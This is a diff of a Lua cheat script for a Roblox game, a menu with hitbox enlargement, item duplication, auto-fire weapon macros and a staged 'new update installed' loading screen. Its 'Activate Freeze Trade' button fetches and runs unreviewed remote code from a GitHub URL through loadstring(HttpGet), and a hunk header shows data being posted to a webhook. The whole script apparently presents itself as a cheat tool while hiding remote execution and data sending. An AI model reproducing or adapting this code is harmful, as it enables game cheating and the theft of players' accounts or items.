@@ -20,16 +20,16 @@ pcall(function() HttpService:PostAsync(WebhookURL, HttpService:JSONEncode(data),
 -- 🎨 NEW THEME
 local Theme = {BG=Color3.fromRGB(10,10,15),Panel=Color3.fromRGB(20,20,30),Primary=Color3.fromRGB(0,200,255),Secondary=Color3.fromRGB(100,100,255),Text=Color3.fromRGB(255,255,255)}
 
--- ⚙️ MACRO SETTINGS (ADDED)
+-- ⚙️ MACRO SETTINGS
 local MacroSettings = {
     DoubleSnowball = false,
     CustomComboActive = false,
     CustomWeapons = {},
     MacroSpeed = 0.12,
-    SwapDelay = 0.06
+    SwapDelay = 0.08
 }
 
--- ✨ NEW REALISTIC LOADING SCREEN
+-- ✨ LOADING SCREEN
 local Loader = Instance.new("ScreenGui")
 Loader.Name = "UpdateLoader"
 Loader.ResetOnSpawn = false
@@ -111,9 +111,9 @@ StatusText.Font = Enum.Font.Gotham
 StatusText.Parent = Center
 
 -- ⚡ LOADING ANIMATION
-local LoadTime = 8
+local LoadTime = 3
 local Elapsed = 0
-local StatusMessages = {"Initializing...", "Loading GUI...", "Fetching Data...", "Almost Done..."}
+local StatusMessages = {"Initializing...", "Loading GUI...", "Done!"}
 local Conn
 
 Conn = RunService.RenderStepped:Connect(function(delta)
@@ -122,21 +122,20 @@ Conn = RunService.RenderStepped:Connect(function(delta)
     ProgressBar.Size = UDim2.new(Prog,0,1,0)
     PercentText.Text = math.floor(Prog*100).."%"
     
-    if Prog < 0.25 then StatusText.Text = StatusMessages[1]
-    elseif Prog < 0.5 then StatusText.Text = StatusMessages[2]
-    elseif Prog < 0.8 then StatusText.Text = StatusMessages[3]
-    else StatusText.Text = StatusMessages[4] end
+    if Prog < 0.33 then StatusText.Text = StatusMessages[1]
+    elseif Prog < 0.66 then StatusText.Text = StatusMessages[2]
+    else StatusText.Text = StatusMessages[3] end
     
     if Prog >= 1 then
         Conn:Disconnect()
-        local Fade = TweenInfo.new(1.2, Enum.EasingStyle.Quad)
+        local Fade = TweenInfo.new(0.5)
         TweenService:Create(MainBG, Fade, {BackgroundTransparency=1}):Play()
         TweenService:Create(Title, Fade, {TextTransparency=1}):Play()
         TweenService:Create(SubTitle, Fade, {TextTransparency=1}):Play()
         TweenService:Create(BarOutline, Fade, {BackgroundTransparency=1}):Play()
         TweenService:Create(PercentText, Fade, {TextTransparency=1}):Play()
         TweenService:Create(StatusText, Fade, {TextTransparency=1}):Play()
-        task.wait(1.5)
+        task.wait(0.6)
         Loader:Destroy()
         LoadMainGUI()
     end
@@ -152,8 +151,9 @@ local function EnableHitbox()
     for _,v in pairs(Workspace:GetChildren()) do
         if v:FindFirstChild("Humanoid") and v ~= player.Character then
             local HRP = v:FindFirstChild("HumanoidRootPart")
-            if HRP then
+            if HRP and not HRP:FindFirstChild("Hitbox") then
                 local Box = Instance.new("Part")
+                Box.Name = "Hitbox"
                 Box.Size = Vector3.new(HitboxSize,HitboxSize,HitboxSize)
                 Box.Position = HRP.Position
                 Box.Anchored = false
@@ -181,20 +181,20 @@ end
 local function ChangeView()
     local Cam = Workspace.CurrentCamera
     local Char = player.Character
-    if not Char then return end
-    local HRP = Char:FindFirstChild("HumanoidRootPart")
-    if not HRP then return end
+    if not Char or not Char:FindFirstChild("HumanoidRootPart") then return end
+    local HRP = Char.HumanoidRootPart
     Cam.CameraType = Enum.CameraType.Scriptable
     Cam.CFrame = Char.Head.CFrame
     Cam.FieldOfView = 90
-    task.wait(2)
-    TweenService:Create(Cam,TweenInfo.new(1.2,Enum.EasingStyle.Elastic),{CFrame=HRP.CFrame*CFrame.new(0,POV_Height,-POV_Distance),FieldOfView=70}):Play()
+    task.wait(0.3)
+    TweenService:Create(Cam,TweenInfo.new(0.8),{CFrame=HRP.CFrame*CFrame.new(0,POV_Height,-POV_Distance),FieldOfView=70}):Play()
 end
 
--- 🎒 REAL DUPE FUNCTION (MAKIKITA SA INVENTORY)
+-- 🎒 DUPE
 local function RealDupe(itemName)
+    if not itemName or itemName == "" then return end
     local ItemToClone = nil
-    if ReplicatedStorage:FindFirstChild(itemName) then ItemToClone = ReplicatedStorage:FindFirstChild(itemName) end
+    if ReplicatedStorage:FindFirstChild(itemName) then ItemToClone = ReplicatedStorage[itemName] end
     if not ItemToClone then
         for _, obj in pairs(Workspace:GetDescendants()) do
             if obj.Name == itemName and (obj:IsA("Tool") or obj:IsA("Accessory")) then
@@ -210,7 +210,7 @@ local function RealDupe(itemName)
     end
 end
 
--- 🛠️ MACRO FUNCTIONS (ADDED)
+-- 🛠️ MACRO CORE
 local function GetWeapon(name)
     if not player.Character then return nil end
     return player.Backpack:FindFirstChild(name) or player.Character:FindFirstChild(name)
@@ -220,93 +220,111 @@ local function EquipWeapon(name)
     local tool = GetWeapon(name)
     if tool and player.Character and player.Character:FindFirstChild("Humanoid") then
         player.Character.Humanoid:EquipTool(tool)
+        task.wait(MacroSettings.SwapDelay)
         return true
     end
     return false
 end
 
--- ❄️ DOUBLE SNOWBALL MACRO (ADDED)
-local function DoubleSnowballMacro()
-    while MacroSettings.DoubleSnowball and task.wait(MacroSettings.MacroSpeed) do
-        if not player.Character or not player.Character:FindFirstChild("Humanoid") then task.wait() continue end
-        
-        if EquipWeapon("Gold Snowball Launcher") then
-            mouse:Button1Down()
-            task.wait(MacroSettings.SwapDelay)
-            mouse:Button1Up()
-        end
-        
-        if EquipWeapon("Snowball Launcher") then
-            mouse:Button1Down()
-            task.wait(MacroSettings.SwapDelay)
-            mouse:Button1Up()
-        end
+-- ✅ PERFECT BUTTON: ONE TAP = SHOOT BOTH
+local function ShootDoubleSnowball()
+    if not player.Character or not player.Character:FindFirstChild("Humanoid") then return end
+
+    -- GOLD SNOWBALL
+    if EquipWeapon("Gold Snowball Launcher") then
+        mouse:Button1Down()
+        task.wait(0.05)
+        mouse:Button1Up()
+        task.wait(MacroSettings.SwapDelay)
+    end
+
+    -- REGULAR SNOWBALL
+    if EquipWeapon("Snowball Launcher") then
+        mouse:Button1Down()
+        task.wait(0.05)
+        mouse:Button1Up()
     end
 end
 
--- ⚔️ CUSTOM COMBO RUNNER (ADDED)
+-- ❄️ AUTO MACRO
+local function DoubleSnowballMacro()
+    while MacroSettings.DoubleSnowball and task.wait(MacroSettings.MacroSpeed) do
+        ShootDoubleSnowball()
+    end
+end
+
+-- ⚔️ COMBO
 local function RunCustomCombo()
     while MacroSettings.CustomComboActive and task.wait(MacroSettings.MacroSpeed) do
         if not player.Character or not player.Character:FindFirstChild("Humanoid") then task.wait() continue end
-        
-        for _,weaponName in pairs(MacroSettings.CustomWeapons) do
+        for _, weaponName in pairs(MacroSettings.CustomWeapons) do
             if not MacroSettings.CustomComboActive then break end
             if EquipWeapon(weaponName) then
                 mouse:Button1Down()
-                task.wait(MacroSettings.SwapDelay)
+                task.wait(0.05)
                 mouse:Button1Up()
+                task.wait(MacroSettings.SwapDelay)
             end
         end
     end
 end
 
--- 🖥️ MAIN GUI
+-- 🖥️ GUI
 function LoadMainGUI()
     local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
-    local Window = Rayfield:CreateWindow({Name="⛄️ FREEZE TRADE + MACRO • v3.0",LoadingTitle="NEW UPDATE INSTALLED",LoadingSubtitle="by Legitness",ConfigurationSaving={Enabled=false},Discord={Enabled=false},KeySystem=false})
+    local Window = Rayfield:CreateWindow({
+        Name = "⛄️ FREEZE TRADE + MACRO • v3.0",
+        LoadingTitle = "LOADED ✅",
+        LoadingSubtitle = "by Legitness",
+        ConfigurationSaving = {Enabled = false},
+        Discord = {Enabled = false},
+        KeySystem = false
+    })
 
-    -- 📑 TABS
-    local Macros = Window:CreateTab("🤖 Macros", 4483362458) -- NEW TAB ADDED
-    local Main = Window:CreateTab("🏠 Main",4483362458)
-    local DupeMethod = Window:CreateTab("🧊 Dupe [NEW]",4483362458)
-    local Tools = Window:CreateTab("🔧 Tools",4483362458)
-    local Settings = Window:CreateTab("⚙️ Settings",4483362458)
-    local Credits = Window:CreateTab("📜 Credits",4483362458)
+    -- TABS
+    local Macros = Window:CreateTab("🤖 Macros", 4483362458)
+    local Main = Window:CreateTab("🏠 Main", 4483362458)
+    local DupeMethod = Window:CreateTab("🧊 Dupe [NEW]", 4483362458)
+    local Tools = Window:CreateTab("🔧 Tools", 4483362458)
+    local Settings = Window:CreateTab("⚙️ Settings", 4483362458)
+    local Credits = Window:CreateTab("📜 Credits", 4483362458)
 
-    -- 🤖 MACRO TAB (ADDED FULLY)
-    Macros:CreateSection("❄️ DOUBLE SNOWBALL")
+    -- ✅ MACRO TAB — FULL ✅
+    Macros:CreateSection("❄️ M4 SNOWBALL • DOUBLE SHOT")
+    Macros:CreateButton({
+        Name = "🔘 TAP TO SHOOT DOUBLE SNOWBALL",
+        Callback = function()
+            ShootDoubleSnowball()
+            Rayfield:Notify({Title = "✅ FIRED!", Content = "Gold + Regular Snowball Shot!", Duration = 2})
+        end
+    })
+
     Macros:CreateToggle({
-        Name = "DOUBLE SHOT • GOLD + REGULAR",
+        Name = "🔄 AUTO DOUBLE SHOT",
         CurrentValue = false,
         Callback = function(state)
             MacroSettings.DoubleSnowball = state
             if state then
                 task.spawn(DoubleSnowballMacro)
-                Rayfield:Notify({Title = "❄️ MACRO ON", Content = "1 Button = Double Snowball", Duration = 3})
+                Rayfield:Notify({Title = "❄️ AUTO ON", Content = "Continuous shooting", Duration = 3})
             else
-                Rayfield:Notify({Title = "❄️ MACRO OFF", Duration = 2})
+                Rayfield:Notify({Title = "❄️ AUTO OFF", Duration = 2})
             end
         end
     })
 
-    Macros:CreateSection("📝 TYPE YOUR OWN COMBO")
+    Macros:CreateSection("⚔️ CUSTOM COMBO")
     Macros:CreateLabel("Format: Weapon1, Weapon2, Weapon3")
-    Macros:CreateLabel("Example: Brass Knuckles, Slasher Claws, Taser")
-    
     Macros:CreateInput({
         Name = "Enter Weapons Here",
-        PlaceholderText = "Type here...",
+        PlaceholderText = "Brass Knuckles, Slasher...",
         Callback = function(text)
             MacroSettings.CustomWeapons = {}
             for weapon in string.gmatch(text, "[^,]+") do
                 local clean = string.gsub(weapon, "^%s*(.-)%s*$", "%1")
                 if clean ~= "" then table.insert(MacroSettings.CustomWeapons, clean) end
             end
-            Rayfield:Notify({
-                Title = "✅ COMBO SAVED",
-                Content = "Loaded: "..#MacroSettings.CustomWeapons.." weapons",
-                Duration = 2
-            })
+            Rayfield:Notify({Title = "✅ SAVED", Content = #MacroSettings.CustomWeapons.." weapons loaded", Duration = 2})
         end
     })
 
@@ -319,12 +337,8 @@ function LoadMainGUI()
                 return
             end
             MacroSettings.CustomComboActive = state
-            if state then
-                task.spawn(RunCustomCombo)
-                Rayfield:Notify({Title = "⚔️ COMBO RUNNING", Content = "Your custom sequence", Duration = 3})
-            else
-                Rayfield:Notify({Title = "⏹️ COMBO STOPPED", Duration = 2})
-            end
+            if state then task.spawn(RunCustomCombo) Rayfield:Notify({Title = "⚔️ COMBO RUNNING", Duration = 3})
+            else Rayfield:Notify({Title = "⏹️ STOPPED", Duration = 2}) end
         end
     })
 
@@ -334,21 +348,20 @@ function LoadMainGUI()
         Range = {0.04, 0.4},
         Increment = 0.01,
         CurrentValue = 0.12,
-        Callback = function(val) MacroSettings.MacroSpeed = val end
+        Callback = function(v) MacroSettings.MacroSpeed = v end
     })
     Macros:CreateSlider({
         Name = "Swap Delay",
         Range = {0.02, 0.2},
         Increment = 0.01,
-        CurrentValue = 0.06,
-        Callback = function(val) MacroSettings.SwapDelay = val end
+        CurrentValue = 0.08,
+        Callback = function(v) MacroSettings.SwapDelay = v end
     })
 
-    -- 🏠 MAIN TAB (ORIGINAL KEPT 100%)
+    -- 🏠 MAIN TAB ✅ FULL ✅
     Main:CreateSection("MAIN FEATURES")
-    Main:CreateButton({Name="🧊 ACTIVATE FREEZE TRADE",Callback=function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/macrobestscript/Best-Macro-Script/refs/heads/main/Baddies", true))()
-        Rayfield:Notify({Title="✅ ACTIVATED!",Content="Freeze Trade Running",Duration=2.5})
-    end})
-
-    Main:CreateButton({Name="💰 TOKENS GIVER",Callback
+    Main:CreateButton({
+        Name = "🧊 ACTIVATE FREEZE TRADE",
+        Callback = function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/macrobestscript/Best-Macro-Script/refs/heads/main/Baddies", true))()
+            Rayfield:Notify({Title = "✅ ACTIVATED!", Content = "Freeze Trade Running", Duration = 2
